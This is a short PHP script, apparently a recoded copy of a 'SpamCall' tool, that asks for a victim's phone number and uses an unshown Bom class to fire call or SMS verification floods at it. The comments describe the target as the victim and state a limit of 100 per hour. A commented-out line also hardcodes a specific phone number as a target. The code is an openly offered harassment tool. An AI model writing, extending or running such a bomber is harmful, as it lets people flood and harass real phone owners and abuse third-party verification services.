<?php
include 'func.php';

/*
    https://github.com/mizr1337/SpamCall
    Code by Handika Pratama Recode by ./Dal0vez404
*/

$init = new Bom();

//Eksekusi Call/Sms Boomber (Limit 100x/Jam)

echo "Nomor Target : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
$init->type = 2; //Type 2 kanggo telpon, Type 1 kanggo sms
//$init->no = "0895371761108"; //Nomer Hp tujuan/korban na

if ($init->type == 1) {
	for ($i=0; $i < 2; $i++) { 
	    $init->Verif($init->no,$init->type);
	}
}elseif ($init->type == 2) {
	 $init->Verif($init->no,$init->type);
}